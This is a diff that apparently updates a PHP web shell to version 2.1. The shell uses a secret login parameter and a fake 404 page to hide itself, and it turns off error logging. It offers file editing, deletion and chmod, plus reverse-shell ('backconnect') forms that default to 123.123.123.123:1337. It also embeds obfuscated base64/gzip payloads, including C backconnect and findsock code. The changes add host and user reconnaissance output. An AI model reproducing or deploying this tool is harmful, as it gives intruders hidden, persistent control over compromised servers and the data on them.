@@ -15,7 +15,7 @@ if(isset($_REQUEST['l0g1n'])) {
 if(!isset($_SESSION['l0g1n'])) {
  header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
 }
-$ver="2.0";
+$ver="2.1";
 // --------------------------------------------- globals 
 @ini_set('display_errors',0);
 @ini_set('log_errors',0);
@@ -50,6 +50,7 @@ if ($download == "1") {
  }
 }
 @set_magic_quotes_runtime(0);
+@ini_set("magic_quotes_runtime", 0);
 // slashes fix by r00nix
 if (get_magic_quotes_gpc()) {
  function stripslashes_deep($value) {
@@ -133,6 +134,9 @@ if ($_COOKIE['d'] != "c") {
  body {
   background-color: black;
   color: white; 
+ }
+ .comment {
+  color: gray;
  }
  </style>';
 } else {
@@ -525,11 +529,11 @@ function scandire($dir) {
    echo "<tr><td>Name</td><td>Type</td><td>Size</td><td>Inode Changed<br>File Modified<br>File Accessed</td><td>Owner<br>Group</td><td>Chmod</td><td>Action</td></tr>";
    for($i=0;$i<count($dire);$i++) {
     $link=$dir.$dire[$i];
-    echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>Dir</td><td>'.view_size(dirsize($link)).'</td><td>'.date("d/m/Y H:i:s",filemtime($link)).'<br>'.date("d/m/Y H:i:s",filectime($link)).'<br>'.date("d/m/Y H:i:s",fileatime($link)).'</td><td>'.owner($link).'</td><td>'.substr(sprintf('%o',fileperms($link)), -4).' <br>('.view_perms_color($link,"string").')</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.dir.value=\''.$dir.'\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Touch">T</a></td></tr>';
+    echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>Dir</td><td>'.view_size(dirsize($link)).'</td><td><font size="-1">'.date("d/m/Y H:i:s",filectime($link)).'<br>'.date("d/m/Y H:i:s",filemtime($link)).'<br>'.date("d/m/Y H:i:s",fileatime($link)).'</font></td><td>'.owner($link).'</td><td>'.substr(sprintf('%o',fileperms($link)), -4).' <br>('.view_perms_color($link,"string").')</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.dir.value=\''.$dir.'\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Touch">T</a></td></tr>';
    }
    for($i=0;$i<count($files);$i++) {
     $linkfile=$dir.$files[$i];
-    echo '<tr><td><a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();">'.$files[$i].'</a><br></td><td>File</td><td>'.view_size(filesize($linkfile)).'</td><td>'.date("d/m/Y H:i:s",filectime($linkfile)).'<br>'.date("d/m/Y H:i:s",filemtime($linkfile)).'<br>'.date("d/m/Y H:i:s",fileatime($linkfile)).'</td><td>'.owner($linkfile).'</td><td>'.substr(sprintf('%o',fileperms($linkfile)), -4).' <br>('.view_perms_color($linkfile,"string").')</td><td> <a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a> <a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();" title="Edit">E</a> <a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Touch">T</a></td></tr></tr>'; 
+    echo '<tr><td><a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();">'.$files[$i].'</a><br></td><td>File</td><td>'.view_size(filesize($linkfile)).'</td><td><font size="-1">'.date("d/m/Y H:i:s",filectime($linkfile)).'<br>'.date("d/m/Y H:i:s",filemtime($linkfile)).'<br>'.date("d/m/Y H:i:s",fileatime($linkfile)).'</font></td><td>'.owner($linkfile).'</td><td>'.substr(sprintf('%o',fileperms($linkfile)), -4).' <br>('.view_perms_color($linkfile,"string").')</td><td> <a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a> <a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();" title="Edit">E</a> <a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Touch">T</a></td></tr></tr>'; 
    }
    echo "</table>";
   }
@@ -1208,7 +1212,7 @@ switch ($_REQUEST['p']) {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">fully interactive backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc"> <input type="submit" value="go"><input name="p" type="hidden" value="b"><input name="shellz" type="hidden" value="pyint"><br></form>';
     echo '<font color="gray">you need to run special client first: <a href="#" onclick="showTooltip(2)" id="link2"> &gt;&gt; show code &lt;&lt; </a><br>with this one you will be able to run mc, top, vim, etc</font>
     <div id="2" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
-    echo '<br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux<br>';
+    echo '<br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux<br>//thanks to ont.rif for interactive backconnect<br>';
     echo "<textarea cols=\"80\" rows=\"20\">";
     echo gzinflate(base64_decode('dVLBbhoxFLzvV0ypUHcly5BWvaDmEKVEQm1BKhv1sEFou/sAKxsb2U4Ifx8/mySEKAfWsj0zb2bM58G9s4P/Sg9IP2C79xujM3W3NdbDmeaWvMDW7wU8fxx11IQTt3cCxmVqhY50zntZ2/UDCvzAt1GGrVXao3ft6jWN0HeoNsb5BSoWXvTQxyupGi5QZNQ5CkSG4RzO2yPAGQMQPZ0jCB9dfY1X7JRZ0bBMS/68vbhaTqbjUjzv57PLX8t5+Xd88Ye53u7D3HgpQw9tjpxNiDivYES665TznPU7H9FjQ1vPvEPSy1p/8WA+Pt3oXsZ9SUfe1rucC5Tz8udkurya/B5PZ6yw26iOUNp7OlL5Vyuv9BorY0POxtzxxuhQ4KjvpJQ3NlZ35C9w84b9CdRta4tDC7Ju2GBevGrPboNA3yWJ2C8TYr63XmAFdgLEUvG9ZVpyVIij5CrAtckL8T7ZQqCKvyiM8Ad5SwmxYOMUtDU/p3HSUh1aP5U+Gw6HSYQxO6s8vTQ5uy4PA0WUSbAwTBvPB2nAy9t0isLadMZRi8ZoHdIoo0MVCUePKlXFEu8ifej4FPmB59NgyfAT'));
     echo "</textarea><br>";
@@ -1260,7 +1264,7 @@ switch ($_REQUEST['p']) {
    $cbdcode.='serv_addr.sin_port = htons('.$_POST["port"].');';
    $cbdcode.="\n";
    $cbdcode.=gzinflate(base64_decode('hVJBasMwELznFVsfilRUEgd6cnNOcymF0rNxpbUtImwjKWloyd+7suzGaQjBIHtn2PHMINfK3EpYwaduFHM0KXQCmPN2Jz0QsC2UsvDA4d6h3edhEuD0N7Yl+0M4z2a6hF6A5O5WsOAww4P27DHlGfRk2dot42fkInAOfVfZjtE3DbpqCsPeN+uXjzcB9M4369ebEmMMo53H5hTk6bqxfvGr1gaBpRx+oorBhmSGfNJobHxMmPU0IUQXUmLnb9Q1WRZUXtSe2AlSz//sEJZ3WtEvKipFKxb7sXu0Ax4bGOqYMDEZhVC7bjnqi170DEkvkCV5wgNKw5I53YK5qxORhIPJughRBmetw3EnACfTxwt2dqTnFw=='));
-   //author/license 
+   //author/license unknown
    $cbccode=gzinflate(base64_decode('XVBNawIxEL3nVwwrlESjq161BRELUqui25Msy5pku6FrIkksVfG/N7vWj3oYMvPmzZuXqUnFih0X0LeOS93KX1DtBu1taDX7Eu4/roSTPkKpSlwqB5tUKlwmqflkFFieGqj7/HsVE3SsKBnvIevMjjkoNVPOTSIVWKl6iKdioxXu0DbxJC/rI8nSjSz28AyD12Q8HUW3zlYb5/HcaWVx6rTE1apuTO7GywUtWz2eW/qt8jO1E5MeoPVBGH0BqDdXCHXtNzqNe6QSB5RxL3a+Cf7zRWE5G74ly2gxGrxTGM/ni1k0S6LhnICfkBlgzLRSgjmccQr44QpQJ/DkHVN/i4PQ2WOfENJvEziirTBGGxysmjFcBEngvyx+pMPl6U6I77bdaktZXovOfdGtJgQrcBCupQptHtDA5tCUAYXpx2Ti+6zQVnh2+eUT+gU='));
    // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
    $findsock=gzinflate(base64_decode('bVLbTsMwDH3vV5gioaR09zdG+QLEG0+ApqxJN4suqZIUcRH/jp11Y0yoUhIfHx87J71EW7e9NnAbPsIkuPrVxPH2Lrv8xaNGdw55tJu/mPKdmqA9ryaAQcr8xXuLJMwY2gg7hRYEn5Tf1CXUW+WLgoM3CV8ZNiA4ARcVLBjoqH9sRP4Y1MbcQINW8+iAHXTOx2eby2Vm3jGKKR2+M9aDgikrolRJ+Gn2sjxNcOEhNacUXbKvI3BOae1XNKEP6l+8ZZynD/hpSIM31wiiy6GFNzsXDTV/Wkxf9txGL7PGeRCNrhZLCm83Juqo1q3heiEZu74+3J+SnTHeqp2hihKuSJ1Wpkr2ZTRjJg1n6+5DHPuVwPavbHRKFGKYHe2KR4dCsso4DPE4pE2WsGDbuGvS23WneoOLiQRVBdPDhPx+khptgziosqeJlHIqOhRHr2Wa18SAmu6a6b6bp4tNT4PZaTBnN1sX2ID0vqZuRT5Zo5307Etewlk0UrQ+PN7fn9HD9sjdH0f4S/xO3/4XA5GP8wH7AQ=='));
@@ -1524,7 +1528,7 @@ switch ($_REQUEST['p']) {
   if (empty($_POST["extraz"]) and $download != "1") {
    echo $title; 
    echo '<font color="blue">---> SysInfo</font><br>';
-   echo '<font color="gray">SERVER_ADDR: '.getenv('SERVER_ADDR').'<br>';
+   echo '<span class="comment">SERVER_ADDR: '.getenv('SERVER_ADDR').'<br>';
    echo 'REMOTE_ADDR: '.getenv('REMOTE_ADDR').'<br>';
    echo 'HTTP_X_FORWARDED_FOR: '.getenv('HTTP_X_FORWARDED_FOR').'<br>';
    echo 'HTTP_PROXY_CONNECTION: '.getenv('HTTP_PROXY_CONNECTION').'<br>';
@@ -1537,15 +1541,71 @@ switch ($_REQUEST['p']) {
    sploent516();
    echo "<br>";
    echo "current dir: ".getcwd()."<br>"; 
-   echo "uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
-   echo "script owner: ".get_current_user()."<br>";
-   if(function_enabled('posix_getpwuid')) { 
-    $processUser = posix_getpwuid(posix_geteuid());
-    echo "current user: ".$processUser['name']."<br>";
-   } else {
-    echo "posix_getpwuid disabled!<br>";
+   if (function_enabled('php_uname')) {
+    echo "php_uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
    }
-   echo "<br></font>";
+   if (function_enabled('posix_uname')) {
+    echo "posix_uname: ";
+    foreach(posix_uname() AS $key=>$value) {
+     print $value." ";
+    }
+    echo "<br>";
+   }
+   echo "script owner: ";
+   if (function_enabled('get_current_user')) {
+    echo get_current_user();
+   } else {
+    echo "get_current_user() disabled!";
+   }
+   if (function_enabled('getmyuid')) {
+    echo " || uid: ".getmyuid().",";
+   } else {
+    echo " getmyuid() disabled,";
+   }
+   if (function_enabled('getmygid')) {
+    echo " gid: ".getmygid();
+   } else {
+    echo " getmygid disabled";
+   }
+   if (extension_loaded('posix')) {
+    echo "<br>current user:";
+    if (function_enabled('posix_getuid')) {
+     if (function_enabled('posix_getpwuid')) { 
+      $processUser = posix_getpwuid(posix_getuid());
+      echo $processUser['name'];
+     } else {
+      echo " posix_getpwuid() disabled!";
+     }
+     echo " || uid: ".posix_getuid().",";
+     if (function_enabled('posix_getgid')) {
+      echo " gid: ".posix_getgid();
+     } else {
+      echo " posix_getgid() disabled";
+     }
+    } else {
+     echo " posix_getuid() disabled!";
+    }
+    echo "<br>effective user:";
+    if (function_enabled('posix_geteuid')) {
+     if (function_enabled('posix_getpwuid')) { 
+      $processUser = posix_getpwuid(posix_getuid());
+      echo $processUser['name'];
+     } else {
+      echo " posix_getpwuid() disabled!";
+     }
+     echo " || euid: ".posix_geteuid();
+     if (function_enabled('posix_getegid')) {
+      echo " egid: ".posix_getegid();
+     } else {
+      echo ", posix_getegid() disabled";
+     }
+    } else {
+     echo " posix_geteuid() disabled!";
+    }
+   } else {
+    echo "<br>posix.so not loaded, can't get user information";
+   }
+   echo "<br><br></span>";
    echo '<font color="blue">---> Extraz</font><br><br>';
    if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
    } else {
